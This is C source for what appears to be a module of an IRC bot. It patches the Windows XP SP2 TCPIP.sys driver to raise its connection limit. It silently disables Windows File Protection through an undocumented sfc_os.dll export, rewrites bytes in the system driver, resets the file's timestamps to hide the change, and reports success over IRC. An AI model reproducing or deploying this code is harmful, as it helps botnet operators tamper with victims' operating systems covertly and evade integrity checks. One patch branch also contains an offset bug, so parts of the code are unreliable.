/*

  TCPIP.sys patcher for winxpsp2 by D

*/


#include "../headers/includes.h"
#include "../headers/functions.h"
#include "../headers/externs.h"

//check if our system is win xp sp2
BOOL checkos() {
	char *os="", *sp="";

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1 && (strstr(verinfo.szCSDVersion, "2") != NULL)) return TRUE;
	else return FALSE;
}

//make backup of our file
BOOL backup(char szPath[MAX_PATH]) {

	char szBckPath[MAX_PATH];

	sprintf(szBckPath, "%s.bck", szPath);
	if (CopyFile(szPath, szBckPath, FALSE)) return TRUE;
	else return FALSE;
}

//disable windows file protection 
void Disable_WFP(char *szFile) {

	//we have to convert ASCII string to Unicode string, else this wont work
	wchar_t path[256];
	MultiByteToWideChar(CP_ACP, 0, szFile, -1, path, 256);

	typedef DWORD(__stdcall *CPP) (DWORD param1, PWCHAR param2, DWORD param3);
	HINSTANCE hmod=LoadLibrary("sfc_os.dll");
	CPP SetSfcFileException;

	// the function is stored at the fifth ordinal in sfc_os.dll
	SetSfcFileException= (CPP)GetProcAddress(hmod,(LPCSTR)5);
	SetSfcFileException(0, path, -1);

	//Now we can modify the system file in a complete stealth.
}

DWORD WINAPI PatcherThread(LPVOID param) { 

	FILE *f;
	int i; 
	HANDLE hTimeFile;
	FILETIME aFileTime, bFileTime, cFileTime;
	char buffer[IRCLINE];

	PATCHER patcher = *((PATCHER *)param);
	PATCHER *patcherp = (PATCHER *)param;
	patcherp->gotinfo = TRUE;

	//change limit to 1000
	char *bytes2180[8] = {"\x4C", "\x16", "\x06", "\x00", "\xE8", "\x03", "\x00", "\x00"};
	char *bytes2892[8] = {"\x43", "\xFC", "\x05", "\x00", "\xE8", "\x03", "\x00", "\x00"};
	//change limit to unknown
	char *bytes2505[2] = {"\xE5", "\xC8"};
	char *bytes2685[3] = {"\x99", "\x47", "\xC8"};
	int match = 0, offset[8];

	char *szByte;
	szByte = (char *) malloc (1);

	BOOL fixed = FALSE;

	//lets wait some time, then patch it.
	Sleep(30000);

	//disable windows checking our file
	Disable_WFP(patcher.path);

	//set our file attributes to normal (just in case being set to readonly)
	SetFileAttributes(patcher.path, FILE_ATTRIBUTE_NORMAL);

	//get time of our file
	hTimeFile = CreateFile(patcher.path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);
	}

	//open file
	f = fopen(patcher.path, "r+b");
	if (f == NULL) {
		_snprintf(buffer, sizeof(buffer), "Can not open TCPIP.SYS, version %d.", patcher.version);
		//irc_privmsg(patcher.sock, techchan, buffer, patcher.notice);
		addlog(buffer);
		clearthread(patcher.threadnum);
		ExitThread(0);
	}

	switch (patcher.version) {
	case 1: 
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[2] = 0x00132;
		offset[3] = 0x00133;
		offset[4] = 0x4F322;
		offset[5] = 0x4F323;
		offset[6] = 0x4F324;
		offset[7] = 0x4F325;
		//check the file
		for (i = 0; i < 8; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2180[i], 1) == 0) match++;
		}
		if (match < 8) { 
			//write bytes to file
			for (i = 0; i < 8; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2180[i], 1, 1, f);
				fixed = TRUE;
			}
		}
		break;
		}
	case 2:
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[2] = 0x00132;
		offset[3] = 0x00133;
		offset[4] = 0x4F5A2;
		offset[5] = 0x4F5A3;
		offset[6] = 0x4F5A4;
		offset[7] = 0x4F5A5;
		//check the file
		for (i = 0; i < 8; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2892[i], 1) == 0) match++;
		}
		if (match < 8) { 
			//write bytes to file
			for (i = 0; i < 8; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2892[i], 1, 1, f);
				fixed = TRUE;
			}
		}
		break;
		}

	//for these 2 versions i have no idea if they fix good - use on your own risk!
	case 3:
		{
		offset[0] = 0x00130;
		offset[1] = 0x4F322;
		//check the file
		for (i = 0; i < 2; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2505[i], 1) == 0) match++;
		}
		if (match < 2) { 
			//write bytes to file
			for (i = 0; i < 2; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2505[i], 1, 1, f);
				fixed = TRUE;
			}
		}
		break;
		}
	case 4:
		{
		offset[0] = 0x00130;
		offset[1] = 0x00131;
		offset[1] = 0x4F5A2;
		//check the file
		for (i = 0; i < 3; i++) {         
			fseek(f, offset[i], SEEK_SET);
			fread(szByte, 1, 1, f);
			if (strncmp(szByte, bytes2685[i], 1) == 0) match++;
		}
		if (match < 3) { 
			//write bytes to file
			for (i = 0; i < 3; i++) {
				fseek(f, offset[i], SEEK_SET);
				fwrite(bytes2685[i], 1, 1, f);
				fixed = TRUE;
			}
		}
		break;
		}
	}

	//close file
	fclose(f);

	//set file time back to what it used to be
	hTimeFile = CreateFile(patcher.path, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);
	}

	if (fixed) {
		_snprintf(buffer, sizeof(buffer), "TCPIP.SYS fixed, version %d.", patcher.version);
		irc_privmsg(patcher.sock, techchan, buffer, patcher.notice);
		addlog(buffer);
	}

	PatchTCPIP = FALSE;

	clearthread(patcher.threadnum);
	ExitThread(0);
}
